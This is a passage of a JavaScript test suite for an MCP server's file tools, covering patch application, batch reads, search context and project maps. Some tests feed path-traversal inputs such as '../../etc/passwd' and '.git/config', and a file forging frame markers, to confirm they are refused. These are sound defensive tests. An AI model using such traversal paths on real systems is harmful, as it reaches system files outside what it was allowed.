  const before = statSync(f);
  const body = '#!/bin/sh\ntrue\n';
  const r = await runScript(verifiedWriteScript(), [f, String(body.length), shaOf(body), '', '0', ''], body);
  assert.equal(r.status, 0, r.err);
  const after = statSync(f);
  assert.equal(after.mode & 0o777, 0o750);
  assert.equal(after.uid, before.uid);
  assert.equal(after.gid, before.gid);
});

test('an insert keeps the target mode too', async () => {
  const dir = scratch();
  const f = join(dir, 'run.sh');
  writeFileSync(f, 'a\nb\n', { mode: 0o755 });
  const r = await runScript(insertAtLineScript(), [f, '1', '2', ''], 'Z\n');
  assert.equal(r.status, 0, r.err);
  assert.equal(statSync(f).mode & 0o777, 0o755);
});

test('readIntegrityError separates a short read from a file that is not UTF-8 text', () => {
  const latin1 = Buffer.from([0x68, 0xe9, 0x0a]);            // "h<0xe9>\n", not UTF-8
  const decoded = Buffer.from(latin1.toString('utf8'), 'utf8');
  const err = readIntegrityError('a.txt', latin1.length, null, decoded);
  assert.match(err, /not valid UTF-8/);
  assert.match(err, /nothing was written/i);
});

// ---- the round-trip reducers: apply_project_patch, read_project_files,
//      search context, project_map ----
//
// These four exist to collapse the orient → search → read → write loop from
// dozens of MCP calls into a handful. The tests that matter are the ones that
// keep them honest while they do it: a patch is all-or-nothing, a batch read
// never returns part of a file, and every budget that cuts something says so.

import { execFileSync } from 'node:child_process';
import {
  MCP_SERVER_INSTRUCTIONS,
  PATCH_INLINE_MAX_BYTES, PATCH_MAX_BYTES,
  parseUnifiedDiffPaths, parseApplyNumstat, expandRenameBraces,
  parseGitApplyFailure, stripApplyNoise, normalizeExpectedShaMap, patchPreconditionError,
  applyPatchScript, patchScriptBlock, parseBeforeBlock, parseAfterBlock, buildPatchFileReport,
  BATCH_READ_MAX_FILES, BATCH_READ_BUDGET_DEFAULT, BATCH_READ_BUDGET_CAP,
  normalizeBatchReadBudget, normalizeBatchReadRequest, batchReadScript, parseBatchReadOutput,
  SEARCH_CONTEXT_MAX, SEARCH_BYTE_BUDGET_DEFAULT, SEARCH_BYTE_BUDGET_CAP,
  normalizeContextLines, normalizeSearchByteBudget, parseGitGrepContext, parseGitGrepFileList,
  PROJECT_MAP_MAX_FILES_DEFAULT, PROJECT_MAP_SYMBOL_PATTERN,
  extractSymbol, buildProjectMap, parseLineCounts,
} from '../lib/mcp-logic.js';

// ---- the catalog and the guidance ----

test('the round-trip reducers are advertised, and the granular tools point at them', () => {
  const byName = new Map(MCP_TOOLS.map((t) => [t.name, t]));
  for (const n of ['apply_project_patch', 'read_project_files', 'project_map']) {
    assert.ok(byName.has(n), `missing tool ${n}`);
  }
  // Each new tool must say when to use it INSTEAD of the granular one — a
  // tool an agent does not know to reach for saves nothing.
  assert.match(byName.get('apply_project_patch').description, /instead of the 2-3 calls per file/);
  assert.match(byName.get('read_project_files').description, /rather than a sequence of read_project_file calls/);
  assert.match(byName.get('project_map').description, /round trip per file/);
  // ...and the granular ones must point the other way.
  assert.match(byName.get('edit_project_file').description, /apply_project_patch/);
  assert.match(byName.get('read_project_file').description, /read_project_files/);
  assert.match(byName.get('list_project_files').description, /project_map/);
  assert.match(byName.get('search_project_files').description, /context_lines/);
});

test('the new parameters are additive — every existing signature still stands', () => {
  const byName = new Map(MCP_TOOLS.map((t) => [t.name, t]));
  const search = byName.get('search_project_files');
  for (const p of ['context_lines', 'files_with_matches', 'max_bytes']) {
    assert.ok(search.inputSchema.properties[p], `search_project_files needs ${p}`);
  }
  // The required list is untouched: a caller that never heard of these keeps
  // working exactly as before.
  assert.deepEqual(search.inputSchema.required, ['project_id', 'pattern']);
  assert.deepEqual(byName.get('read_project_file').inputSchema.required, ['project_id', 'path']);
  // A patch needs only the project — patch OR ticket is checked at call time
  // so the error can name both routes.
  assert.deepEqual(byName.get('apply_project_patch').inputSchema.required, ['project_id']);
  assert.deepEqual(byName.get('read_project_files').inputSchema.required, ['project_id', 'files']);
  assert.deepEqual(byName.get('project_map').inputSchema.required, ['project_id']);
  // The patch tool carries the same concurrent-editor guard as every other
  // write, one entry per file.
  assert.equal(byName.get('apply_project_patch').inputSchema.properties.expected_sha256.type, 'object');
});

test('the server instructions state the working order, not just the capabilities', () => {
  for (const must of ['project_map', 'context_lines', 'read_project_files', 'apply_project_patch']) {
    assert.ok(MCP_SERVER_INSTRUCTIONS.includes(must), `instructions must mention ${must}`);
  }
  // The order is the point: orient, search-with-context, batch read, patch.
  const at = (s) => MCP_SERVER_INSTRUCTIONS.indexOf(s);
  assert.ok(at('project_map') < at('context_lines'), 'orient before search');
  assert.ok(at('context_lines') < at('read_project_files'), 'search before read');
  assert.ok(at('read_project_files') < at('apply_project_patch'), 'read before write');
  assert.match(MCP_SERVER_INSTRUCTIONS, /do NOT follow a search with reads/);
});

// ---- unified diff parsing ----

const PATCH_MODIFY_AND_ADD = `diff --git a/a.ts b/a.ts
--- a/a.ts
+++ b/a.ts
@@ -1,3 +1,3 @@
 one
-two
+TWO
 three
diff --git a/c.ts b/c.ts
new file mode 100644
--- /dev/null
+++ b/c.ts
@@ -0,0 +1,1 @@
+brand new
`;

test('parseUnifiedDiffPaths reads the touched paths and the change type off the headers', () => {
  const p = parseUnifiedDiffPaths(PATCH_MODIFY_AND_ADD);
  assert.equal(p.error, undefined);
  assert.deepEqual(p.paths, ['a.ts', 'c.ts']);
  assert.equal(p.files[0].change, 'modified');
  assert.equal(p.files[1].change, 'added');
});

test('parseUnifiedDiffPaths handles deletes and renames, keeping BOTH sides of a rename', () => {
  const del = parseUnifiedDiffPaths(`diff --git a/gone.ts b/gone.ts
deleted file mode 100644
--- a/gone.ts
+++ /dev/null
@@ -1 +0,0 @@
-bye
`);
  assert.equal(del.files[0].change, 'deleted');
  assert.deepEqual(del.paths, ['gone.ts']);

  const ren = parseUnifiedDiffPaths(`diff --git a/old.ts b/new.ts
similarity index 90%
rename from old.ts
rename to new.ts
--- a/old.ts
+++ b/new.ts
@@ -1 +1 @@
-a
+b
`);
  assert.equal(ren.files[0].change, 'renamed');
  assert.equal(ren.files[0].path, 'new.ts');
  assert.equal(ren.files[0].from, 'old.ts');
  // Both move, so both are locked, rolled back and committed.
  assert.deepEqual(ren.paths, ['old.ts', 'new.ts']);
});

test('parseUnifiedDiffPaths refuses a patch that reaches outside the app checkout', () => {
  for (const escape of ['../../etc/passwd', '/etc/passwd', '.git/config']) {
    const r = parseUnifiedDiffPaths(`diff --git a/${escape} b/${escape}\n--- a/${escape}\n+++ b/${escape}\n@@ -1 +1 @@\n-a\n+b\n`);
    assert.ok(r.error, `${escape} must be refused`);
    assert.match(r.error, /inside the app checkout/);
  }
});

test('parseUnifiedDiffPaths refuses text that is not a diff at all', () => {
  assert.match(parseUnifiedDiffPaths('').error, /empty/);
  assert.match(parseUnifiedDiffPaths('here is my change: rename foo to bar').error, /does not look like a unified diff/);
});

test("parseApplyNumstat reads git's counts, including binary and rename rows", () => {
  const rows = parseApplyNumstat('1\t2\tsrc/a.ts\n-\t-\tlogo.png\n3\t0\tsrc/{old => new}.ts\n');
  assert.equal(rows[0].lines_added, 1);
  assert.equal(rows[0].lines_removed, 2);
  assert.equal(rows[1].binary, true);
  assert.equal(rows[1].lines_added, null);
  assert.equal(rows[2].path, 'src/new.ts', 'the rename shorthand resolves to the destination');
  assert.equal(expandRenameBraces('a => b'), 'b');
  assert.equal(expandRenameBraces('plain/path.ts'), 'plain/path.ts');
});

test('parseGitApplyFailure keeps the per-hunk detail rather than "it failed"', () => {
  const f = parseGitApplyFailure([
    'error: patch failed: src/a.ts:12',
    'error: src/a.ts: patch does not apply',
    'error: src/b.ts: No such file or directory',
  ].join('\n'));
  assert.equal(f.conflicted, false);
  assert.equal(f.rejects.length, 3);
  assert.equal(f.rejects[0].line, 12);
  assert.match(f.rejects[0].reason, /context does not match/);
  assert.match(f.rejects[2].reason, /not in the checkout/);
});

test('parseGitApplyFailure treats "applied with conflicts" as a rejection', () => {
  // The trap: with --3way this is what git says while EXITING 0 under --check.
  // Read as success it puts conflict markers in a source file.
  const f = parseGitApplyFailure("Applied patch to 'src/a.ts' with conflicts.");
  assert.equal(f.conflicted, true);
  assert.deepEqual(f.conflict_paths, ['src/a.ts']);
  assert.match(f.rejects[0].reason, /3-way merge could not resolve/);
});

test("stripApplyNoise drops git's successful-3way chatter, keeps real errors", () => {
  const noisy = 'error: repository lacks the necessary blob to perform 3-way merge.\nFalling back to direct application...\nerror: src/a.ts: patch does not apply';
  assert.equal(stripApplyNoise(noisy), 'error: src/a.ts: patch does not apply');
});

test('the expected_sha256 map is validated per entry and refuses a stale patch', () => {
  const sha = 'a'.repeat(64);
  assert.equal(normalizeExpectedShaMap(undefined).map, null);
  assert.match(normalizeExpectedShaMap(['src/a.ts']).error, /object mapping/);
  assert.match(normalizeExpectedShaMap({ '../x': sha }).error, /relative to the app root/);
  assert.match(normalizeExpectedShaMap({ 'src/a.ts': 'nope' }).error, /64-character hex/);

  const { map } = normalizeExpectedShaMap({ 'src/a.ts': sha });
  assert.equal(patchPreconditionError(map, new Map([['src/a.ts', sha]])), null);
  assert.match(patchPreconditionError(map, new Map([['src/a.ts', 'b'.repeat(64)]])), /has changed since you read it/);
  assert.match(patchPreconditionError(map, new Map([['src/a.ts', null]])), /not in the checkout/);
  assert.match(patchPreconditionError(map, new Map([['src/a.ts', NO_SHA]])), /cannot be verified/);
  assert.equal(patchPreconditionError(null, new Map()), null);
});

test('buildPatchFileReport believes the filesystem over the diff header', () => {
  const files = [{ path: 'a.ts', change: 'modified' }, { path: 'b.ts', change: 'deleted' }];
  const numstat = [{ path: 'a.ts', lines_added: 2, lines_removed: 1, binary: false }];
  const after = new Map([['a.ts', { sha256: 'x', size_bytes: 9, total_lines: 2 }], ['b.ts', null]]);
  const rows = buildPatchFileReport(files, numstat, after);
  assert.equal(rows[0].lines_added, 2);
  assert.equal(rows[0].sha256, 'x');
  assert.equal(rows[1].change, 'deleted');
  assert.equal(rows[1].sha256, null, 'a deleted file reports no hash rather than a stale one');
  // A dry run has no after-state: the header's claim stands, unverified.
  assert.equal(buildPatchFileReport(files, numstat, null)[1].change, 'deleted');
});

test('patch size caps: inline is the small door, the ticket is the big one', () => {
  assert.ok(PATCH_INLINE_MAX_BYTES < PATCH_MAX_BYTES);
  assert.equal(PATCH_INLINE_MAX_BYTES, 1024 * 1024);
});

// ---- applyPatchScript, run for real against a git repo ----
//
// The contract is "byte-identical or fully applied", and a contract about a
// filesystem is only worth what running it proves.

function gitScratch() {
  const dir = scratch();
  const g = (...a) => execFileSync('git', ['-C', dir, ...a], { encoding: 'utf8' });
  g('init', '-q', '.');
  g('config', 'user.email', 'test@proxypilot');
  g('config', 'user.name', 'test');
  writeFileSync(join(dir, 'a.ts'), 'one\ntwo\nthree\n');
  g('add', '-A');
  g('commit', '-qm', 'init');
  return { dir, g };
}
// The script hardcodes the container's checkout; point it at the scratch repo.
const patchScriptFor = (dir) => applyPatchScript().replace('cd /srv/app', `cd ${dir}`);
const patchArgs = (patch, mode, paths, pre = '') => [String(Buffer.byteLength(patch, 'utf8')), shaOf(patch), mode, pre, ...paths];
const treeState = (dir) => readdirSync(dir).filter((f) => f !== '.git').sort()
  .map((f) => `${f}:${shaOf(readFileSync(join(dir, f), 'utf8'))}`).join('|');

test('applyPatchScript applies a multi-file patch and stages it, reporting the real hashes', async () => {
  const { dir, g } = gitScratch();
  const r = await runScript(patchScriptFor(dir), patchArgs(PATCH_MODIFY_AND_ADD, 'apply', ['a.ts', 'c.ts']), PATCH_MODIFY_AND_ADD);
  assert.equal(r.status, 0, r.err);
  assert.match(r.out, /PP_OK/);
  assert.equal(readFileSync(join(dir, 'a.ts'), 'utf8'), 'one\nTWO\nthree\n');
  assert.equal(readFileSync(join(dir, 'c.ts'), 'utf8'), 'brand new\n');
  const after = parseAfterBlock(patchScriptBlock(r.out, 'AFTER'));
  assert.equal(after.get('a.ts').sha256, shaOf('one\nTWO\nthree\n'), 'the hash is read back off the file');
  assert.equal(after.get('a.ts').total_lines, 3);
  assert.match(g('status', '--porcelain'), /A {2}c\.ts/, 'the change is staged for the commit');
});

test('applyPatchScript dry run reports the change and touches nothing', async () => {
  const { dir } = gitScratch();
  const before = treeState(dir);
  const r = await runScript(patchScriptFor(dir), patchArgs(PATCH_MODIFY_AND_ADD, 'check', ['a.ts', 'c.ts']), PATCH_MODIFY_AND_ADD);
  assert.equal(r.status, 0, r.err);
  assert.match(r.out, /PP_DRYRUN_OK/);
  assert.equal(treeState(dir), before, 'a dry run must not write');
  assert.equal(existsSync(join(dir, 'c.ts')), false, 'a dry run must not create');
  const ns = parseApplyNumstat(patchScriptBlock(r.out, 'NUMSTAT').join('\n'));
  assert.deepEqual(ns.map((x) => x.path), ['a.ts', 'c.ts']);
  const bef = parseBeforeBlock(patchScriptBlock(r.out, 'BEFORE'));
  assert.equal(bef.get('a.ts'), shaOf('one\ntwo\nthree\n'));
  assert.equal(bef.get('c.ts'), null, 'a file the patch would create reports as absent');
});

test('a partially-applicable patch leaves the checkout byte-identical', async () => {
  const { dir } = gitScratch();
  // Hunk one cannot apply (wrong context); the second file could. git apply is
  // all-or-nothing, and this is the test that keeps it that way.
  const patch = `diff --git a/a.ts b/a.ts
--- a/a.ts
+++ b/a.ts
@@ -1,3 +1,3 @@
 one
-NOT THIS LINE
+TWO
 three
diff --git a/c.ts b/c.ts
new file mode 100644
--- /dev/null
+++ b/c.ts
@@ -0,0 +1,1 @@
+brand new
`;
  const before = treeState(dir);
  const r = await runScript(patchScriptFor(dir), patchArgs(patch, 'apply', ['a.ts', 'c.ts']), patch);
  assert.equal(r.status, 66, r.err);
  assert.equal(treeState(dir), before, 'the checkout must be byte-identical after a refusal');
  assert.equal(existsSync(join(dir, 'c.ts')), false, 'the applicable half must not have landed');
  const failure = parseGitApplyFailure(r.err);
  assert.ok(failure.rejects.some((x) => x.path === 'a.ts' && x.line === 1), JSON.stringify(failure.rejects));
});

test('a patch that would apply only "with conflicts" is refused, not merged', async () => {
  const { dir, g } = gitScratch();
  // A real 3-way: the pre-image blob IS in the repo, so git will happily
  // produce a conflicted file. --check exits 0 on this. It must still refuse.
  writeFileSync(join(dir, 'a.ts'), 'one\nMINE\nthree\n');
  g('add', '-A');
  g('commit', '-qm', 'local edit');
  const patch = `diff --git a/a.ts b/a.ts
index ${g('rev-parse', 'HEAD~1:a.ts').trim()}..${'0'.repeat(40)} 100644
--- a/a.ts
+++ b/a.ts
@@ -1,3 +1,3 @@
 one
-two
+THEIRS
 three
`;
  const before = treeState(dir);
  const r = await runScript(patchScriptFor(dir), patchArgs(patch, 'apply', ['a.ts']), patch);
  assert.notEqual(r.status, 0, 'a conflicted apply is not a success');
  assert.equal(treeState(dir), before);
  assert.ok(!readFileSync(join(dir, 'a.ts'), 'utf8').includes('<<<<<<<'), 'no conflict markers may reach the file');
});

test('the expected_sha256 precondition is enforced BEFORE the apply, not after it', async () => {
  // The point of the guard is that a stale patch never lands. A caller-side
  // check on hashes the script reported could only ever run after the write,
  // which would make it a post-mortem rather than a guard — so the check has
  // to happen on the far side, and this is the test that says so.
  const { dir } = gitScratch();
  const current = shaOf('one\ntwo\nthree\n');
  const stale = 'b'.repeat(64);
  const before = treeState(dir);

  let r = await runScript(patchScriptFor(dir),
    patchArgs(PATCH_MODIFY_AND_ADD, 'apply', ['a.ts', 'c.ts'], `${stale} a.ts`), PATCH_MODIFY_AND_ADD);
  assert.equal(r.status, 69);
  assert.match(r.err, /PP_PRECONDITION a\.ts/);
  assert.equal(treeState(dir), before, 'a stale precondition must stop the write, not describe it');
  assert.equal(existsSync(join(dir, 'c.ts')), false);

  // The real hash lets the same patch through.
  r = await runScript(patchScriptFor(dir),
    patchArgs(PATCH_MODIFY_AND_ADD, 'apply', ['a.ts', 'c.ts'], `${current} a.ts`), PATCH_MODIFY_AND_ADD);
  assert.equal(r.status, 0, r.err);
  assert.equal(readFileSync(join(dir, 'a.ts'), 'utf8'), 'one\nTWO\nthree\n');
});

test('a precondition naming a file that is not there is refused too', async () => {
  const { dir } = gitScratch();
  const r = await runScript(patchScriptFor(dir),
    patchArgs(PATCH_MODIFY_AND_ADD, 'check', ['a.ts', 'c.ts'], `${'c'.repeat(64)} c.ts`), PATCH_MODIFY_AND_ADD);
  assert.equal(r.status, 69);
  assert.match(r.err, /PP_PRECONDITION c\.ts ABSENT/);
});

test('applyPatchScript refuses a truncated or corrupted patch before git sees it', async () => {
  let { dir } = gitScratch();
  // Declared 99999 bytes, a few hundred arrive: a truncated transfer.
  let r = await runScript(patchScriptFor(dir), ['99999', shaOf(PATCH_MODIFY_AND_ADD), 'apply', '', 'a.ts', 'c.ts'], PATCH_MODIFY_AND_ADD);
  assert.equal(r.status, 65);
  assert.match(r.err, /PP_PATCH_BYTES/);
  assert.equal(readFileSync(join(dir, 'a.ts'), 'utf8'), 'one\ntwo\nthree\n');

  ({ dir } = gitScratch());
  r = await runScript(patchScriptFor(dir),
    [String(Buffer.byteLength(PATCH_MODIFY_AND_ADD)), shaOf('a different patch'), 'apply', '', 'a.ts', 'c.ts'], PATCH_MODIFY_AND_ADD);
  assert.equal(r.status, 65);
  assert.match(r.err, /PP_PATCH_SHA/);
});

test('applyPatchScript refuses to apply over uncommitted work', async () => {
  const { dir } = gitScratch();
  writeFileSync(join(dir, 'a.ts'), 'work in progress\n');
  const r = await runScript(patchScriptFor(dir), patchArgs(PATCH_MODIFY_AND_ADD, 'apply', ['a.ts', 'c.ts']), PATCH_MODIFY_AND_ADD);
  assert.equal(r.status, 64);
  assert.match(r.err, /PP_DIRTY/);
  assert.equal(readFileSync(join(dir, 'a.ts'), 'utf8'), 'work in progress\n',
    "someone else's in-flight edit is never clobbered");
});

// ---- batchReadScript, run for real ----

test('batchReadScript returns each file byte-exact, whatever its ending', async () => {
  const dir = scratch();
  const withNl = 'alpha\nbravo\ncharlie\n';
  const withoutNl = 'no trailing newline';
  writeFileSync(join(dir, 'a.txt'), withNl);
  writeFileSync(join(dir, 'b.txt'), withoutNl);
  writeFileSync(join(dir, 'empty.txt'), '');
  const r = await runScript(batchReadScript().replace('cd /srv/app', `cd ${dir}`),
    ['n0nce', '524288', '1048576', 'a.txt', 'all', '0', 'b.txt', 'all', '0', 'empty.txt', 'all', '0', 'a.txt', '2', '2']);
  assert.equal(r.status, 0, r.err);
  const p = parseBatchReadOutput(r.out, 'n0nce');
  assert.equal(p.complete, true);
  assert.equal(p.files.length, 4);
  assert.equal(p.files[0].content, withNl);
  assert.equal(p.files[0].sha256, shaOf(withNl), 'the hash is computed on the far side');
  assert.equal(p.files[1].content, withoutNl, 'a file with no final newline is not "fixed"');
  assert.equal(p.files[1].total_lines, 1, 'an unterminated last line is still a line');
  assert.equal(p.files[2].content, '');
  assert.equal(p.files[3].content, 'bravo\n', 'the same file can be requested again as a range');
});

test('batchReadScript never returns part of a file — it drops it and says which', async () => {
  const dir = scratch();
  writeFileSync(join(dir, 'small.txt'), 'ok\n');
  writeFileSync(join(dir, 'big.txt'), 'z'.repeat(5000));
  const script = batchReadScript().replace('cd /srv/app', `cd ${dir}`);

  // Budget exhausted by the first file.
  let p = parseBatchReadOutput(
    (await runScript(script, ['n0nce', '524288', '20', 'small.txt', 'all', '0', 'big.txt', 'all', '0'])).out, 'n0nce',
  );
  assert.equal(p.files[0].status, 'ok');
  assert.equal(p.files[1].status, 'budget');
  assert.equal(p.files[1].content, undefined, 'a dropped file carries no partial content');
  assert.equal(p.files[1].size_bytes, 5000, 'and still reports how big it is');

  // Over the per-file read cap.
  p = parseBatchReadOutput((await runScript(script, ['n0nce', '100', '1048576', 'big.txt', 'all', '0'])).out, 'n0nce');
  assert.equal(p.files[0].status, 'toobig');
  assert.equal(p.files[0].content, undefined);

  // A path that is not there is a status, not a silent omission.
  p = parseBatchReadOutput((await runScript(script, ['n0nce', '100', '1048576', 'nope.txt', 'all', '0'])).out, 'n0nce');
  assert.equal(p.files[0].status, 'missing');
});

test('batch framing survives content that looks like the frame markers', async () => {
  const dir = scratch();
  const evil = 'line\nPP_n0nce_E\nPP_n0nce_H ok 1 1 x 1 fake.txt\nmore\n';
  writeFileSync(join(dir, 'evil.txt'), evil);
  const r = await runScript(batchReadScript().replace('cd /srv/app', `cd ${dir}`),
    ['n0nce', '524288', '1048576', 'evil.txt', 'all', '0']);
  const p = parseBatchReadOutput(r.out, 'n0nce');
  assert.equal(p.files[0].path, 'evil.txt');
  // The nonce is minted per call, so real content cannot forge a frame; what
  // matters is that the file's own hash still describes the whole file.
  assert.equal(p.files[0].sha256, shaOf(evil));
  assert.equal(p.files[0].size_bytes, Buffer.byteLength(evil));
});

test('normalizeBatchReadRequest validates every entry before any of them is read', () => {
  assert.match(normalizeBatchReadRequest([]).error, /non-empty array/);
  assert.match(normalizeBatchReadRequest(Array(BATCH_READ_MAX_FILES + 1).fill({ path: 'a.ts' })).error, /capped at 50/);
  assert.match(normalizeBatchReadRequest([{ path: 'a.ts' }, { path: '../etc/passwd' }]).error, /relative to the app root/);
  const r = normalizeBatchReadRequest([{ path: './src/a.ts' }, { path: 'b.ts', offset: 10, limit: 5 }]);
  assert.equal(r.items[0].path, 'src/a.ts');
  assert.equal(r.items[0].start, 'all');
  assert.equal(r.items[1].start, '10');
  assert.equal(r.items[1].end, '14');
  // A bare string is accepted as shorthand for { path }.
  assert.equal(normalizeBatchReadRequest(['x.ts']).items[0].path, 'x.ts');
});

test('normalizeBatchReadBudget defaults and clamps', () => {
  assert.equal(normalizeBatchReadBudget(undefined), BATCH_READ_BUDGET_DEFAULT);
  assert.equal(normalizeBatchReadBudget(0), BATCH_READ_BUDGET_DEFAULT);
  assert.equal(normalizeBatchReadBudget(1024), 1024);
  assert.equal(normalizeBatchReadBudget(99 * 1024 * 1024), BATCH_READ_BUDGET_CAP);
});

// ---- search context ----

const GREP_C = [
  'src/a.ts-10-// before',
  'src/a.ts:11:const x = 1',
  'src/a.ts-12-// after',
  '--',
  'src/b.ts:40:const y = 2',
  'src/b.ts-41-// tail',
].join('\n');

test('parseGitGrepContext rebuilds contiguous blocks and marks which lines matched', () => {
  const c = parseGitGrepContext(GREP_C, {});
  assert.equal(c.blocks.length, 2);
  assert.equal(c.blocks[0].path, 'src/a.ts');
  assert.equal(c.blocks[0].start_line, 10);
  assert.deepEqual(c.blocks[0].lines, ['// before', 'const x = 1', '// after']);
  assert.deepEqual(c.blocks[0].match_lines, [11]);
  assert.equal(c.match_count, 2, 'context lines are not matches');
  assert.equal(c.truncated, false);
});

test('parseGitGrepContext honours both budgets and says when it cut', () => {
  const byResults = parseGitGrepContext(GREP_C, { maxResults: 1 });
  assert.equal(byResults.match_count, 1);
  assert.equal(byResults.truncated, true);
  const byBytes = parseGitGrepContext(GREP_C, { maxBytes: 12 });
  assert.equal(byBytes.truncated, true, 'a wide -C cannot blow up the response');
});

test('parseGitGrepContext starts a new block when the lines are not consecutive', () => {
  // git normally emits `--`, but a run that jumps must not be glued together
  // into a block whose start_line lies about what the lines are.
  const c = parseGitGrepContext('a.ts:1:one\na.ts:50:fifty', {});
  assert.equal(c.blocks.length, 2);
  assert.equal(c.blocks[1].start_line, 50);
});

test('normalizeContextLines and the byte budget default off and clamp', () => {
  assert.equal(normalizeContextLines(undefined), 0, 'existing callers see no context');
  assert.equal(normalizeContextLines(5), 5);
  assert.equal(normalizeContextLines(999), SEARCH_CONTEXT_MAX);
  assert.equal(normalizeContextLines(-3), 0);
  assert.equal(normalizeSearchByteBudget(undefined), SEARCH_BYTE_BUDGET_DEFAULT);
  assert.equal(normalizeSearchByteBudget(10 * 1024 * 1024), SEARCH_BYTE_BUDGET_CAP);
});

test('parseGitGrepFileList caps the paths and reports the true total', () => {
  const l = parseGitGrepFileList('a.ts\nb.ts\nc.ts\n', 2);
  assert.deepEqual(l.files, ['a.ts', 'b.ts']);
  assert.equal(l.truncated, true);
  assert.equal(l.total, 3);
});

// ---- project_map ----

test('extractSymbol names the declaration kinds a map is for', () => {
  const cases = [
    ['export function createRouter(app) {', 'function', 'createRouter'],
    ['export default class Widget extends X {', 'class', 'Widget'],
    ['export const MCP_TOOLS = [', 'const', 'MCP_TOOLS'],
    ['export type ProjectId = number', 'type', 'ProjectId'],
    ['export interface Options {', 'interface', 'Options'],
    ['export { a, b } from "./x"', 're-export', 'a, b'],
    ['module.exports = router', 'module.exports', 'module.exports'],
    ['  router.post("/api/projects", handler)', 'route', 'POST /api/projects'],
    ['def handler(request):', 'function', 'handler'],
    ['func (s *Server) Start() error {', 'function', 'Start'],
  ];
  for (const [line, kind, name] of cases) {
    const s = extractSymbol(line);
    assert.ok(s, `no symbol from ${line}`);
    assert.equal(s.kind, kind, line);
    assert.equal(s.name, name, line);
  }
  assert.equal(extractSymbol('// just a comment'), null, 'prose yields nothing rather than a guess');
  assert.equal(extractSymbol(''), null);
  assert.equal(extractSymbol('export function foo() {').exported, true);
});

test("the map's grep pattern is a plain ERE — git takes it as an argument, not a script", () => {
  // It rides as a positional argument to git grep, never through a shell, so
  // the only thing to police is that it stays plain text: tabs belong to the
  // whitespace classes, but nothing else in the control range belongs here.
  const control = [...PROJECT_MAP_SYMBOL_PATTERN]
    .filter((ch) => ch !== '\t' && (ch.charCodeAt(0) < 0x20 || ch.charCodeAt(0) === 0x7f));
  assert.deepEqual(control, []);
  // And it must actually find the shapes the extractor knows about.
  const re = new RegExp(PROJECT_MAP_SYMBOL_PATTERN);
  for (const line of ['export function a() {', 'module.exports = x', '  app.get("/x", h)', 'def a():', 'class A {']) {
    assert.ok(re.test(line), `pattern should match ${JSON.stringify(line)}`);
  }
});

test('parseLineCounts reads git grep -c output, colons in paths and all', () => {
  const c = parseLineCounts('src/a.ts:120\nsrc/od:d/b.ts:7\n');
  assert.equal(c.get('src/a.ts'), 120);
  assert.equal(c.get('src/od:d/b.ts'), 7, 'the LAST colon is the separator');
});

test('buildProjectMap joins the three answers and names everything it cut', () => {
  const map = buildProjectMap({
    files: ['a.ts', 'b.ts', 'logo.png'],
    counts: parseLineCounts('a.ts:10\nb.ts:20\n'),
    symbolHits: [
      { path: 'a.ts', line_number: 3, line: 'export function foo() {' },
      { path: 'a.ts', line_number: 9, line: 'not a declaration at all' },
    ],
    maxFiles: 2,
  });
  assert.equal(map.file_count, 3);
  assert.equal(map.files.length, 2);
  assert.equal(map.truncated, true);
  assert.equal(map.omitted, 1);
  assert.match(map.omitted_note, /not in this map/);
  assert.equal(map.files[0].symbols.length, 1, 'a line the extractor cannot name is dropped, not guessed');
  assert.equal(map.files[0].symbols[0].line, 3);
  assert.equal(map.files[1].lines, 20);
  assert.equal(PROJECT_MAP_MAX_FILES_DEFAULT, 400);
});

test('buildProjectMap reports a binary file as uncounted rather than as empty', () => {
  const map = buildProjectMap({ files: ['logo.png'], counts: new Map() });
  assert.equal(map.files[0].lines, null);
  assert.match(map.files[0].note, /binary or unreadable/);
});

test('buildProjectMap caps symbols per file and says so', () => {
  const hits = Array.from({ length: 50 }, (_, i) => ({ path: 'a.ts', line_number: i + 1, line: `export const s${i} = 1` }));
  const map = buildProjectMap({ files: ['a.ts'], counts: new Map([['a.ts', 50]]), symbolHits: hits, maxSymbolsPerFile: 10 });
  assert.equal(map.files[0].symbols.length, 10);
  assert.deepEqual(map.symbols_truncated, [{ path: 'a.ts', shown: 10, total: 50 }]);
});

// ---- the write-verification ratchet, extended to the patch tool ----

test('apply_project_patch inherits the staged-and-verified write discipline', () => {
  const script = applyPatchScript();
  // The patch is a payload like any other: counted, then hashed, before git
  // is allowed to read it.
  assert.match(script, /PP_PATCH_BYTES/);
  assert.match(script, /PP_PATCH_SHA/);
  // It refuses to apply over uncommitted work...
  assert.match(script, /git status --porcelain/);
  assert.match(script, /PP_DIRTY/);
  // ...checks before it writes...
  assert.match(script, /git apply --check --3way/);
  // ...enforces expected_sha256 on the far side, where it can still stop a write...
  assert.match(script, /PP_PRECONDITION/);
  // ...and rolls the touched paths back on every failure path.
  assert.match(script, /git checkout -f -q HEAD/);
  assert.match(script, /PP_APPLY_FAILED/);
  // The read-back: hashes come off the files afterwards, not out of git.
  assert.match(script, /PP_AFTER_BEGIN/);
  // And it never takes the shortcut the truncation bug shipped through.
  assert.equal(/cat > "\$p"/.test(script), false);
});

test('the batch read hashes on the far side, so a short transfer cannot pass', () => {
  const script = batchReadScript();
  assert.match(script, /pp_sha "\$p"/);
  // Over-cap and over-budget are announced, never silently trimmed.
  assert.match(script, /toobig/);
  assert.match(script, /budget/);
  assert.equal(/head -c/.test(script), false, 'a batch read must not truncate a file to fit');
});

// ---- the 2026-08-25 field session: every defect it surfaced, pinned ----

import {
  LXC_LIST_CAPTURE_CAP, captureEvidence,
  pickUpstreamAddress, isNonRoutableIface, ipv4InCidr, instanceNicParent,
  validRoutePathPrefix, validRouteHealthPath, shortFlagCluster,
} from '../lib/mcp-logic.js';
import {
  parseProcKeyUsers, keyringAssessment, parseIncusVersion,
  parseNetworkIpv4Cidr, parseDfKb, KERNEL_KEYS_DEFAULT_MAXKEYS,
} from '../lib/host-facts.js';

test('a listing bigger than the old cap survives, and a truncated one says so with evidence', () => {
  // `incus list --format json` carries the whole instance record per guest, so
  // a busy host blows straight past the 256 KB default capture cap and the
  // JSON arrives cut mid-object. The cap for listings has to clear any
  // plausible inventory...
  const guest = (i) => ({
    name: `pp-guest${i}`,
    status: 'Running',
    config: Object.fromEntries(Array.from({ length: 40 }, (_, k) => [`limits.k${k}`, 'x'.repeat(120)])),
    state: { network: { eth0: { addresses: [{ address: `10.0.${i % 255}.5`, family: 'inet', scope: 'global' }] } } },
  });
  const payload = JSON.stringify(Array.from({ length: 200 }, (_, i) => guest(i)));
  assert.ok(payload.length > 1024 * 1024, 'fixture must exceed the 1 MiB the old cap could not hold');
